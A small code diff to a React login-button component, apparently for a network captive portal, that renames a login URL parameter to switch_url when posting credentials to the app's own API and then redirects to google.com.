@@ -52,12 +52,12 @@ const LoginButton = ({login,continu2,isAuthenticated,authLoading,postUrl,isAndro
           )}}
 
     const getAccessNetwork = async()=>{
-      const login_url =login || cookies.login_url
+      const switch_url =login || cookies.login_url
       const continue_url =continu2 || cookies.continue_url
       console.log('si dio like')
       let link =document.createElement('a');
       try{
-        const res =  await axios.post('/api/send',{username,password,continue_url,login_url});
+        const res =  await axios.post('/api/send',{username,password,continue_url,switch_url});
         dispatch(uiActions.setLoading(false))
         link.href = 'https://google.com';
         link.click();
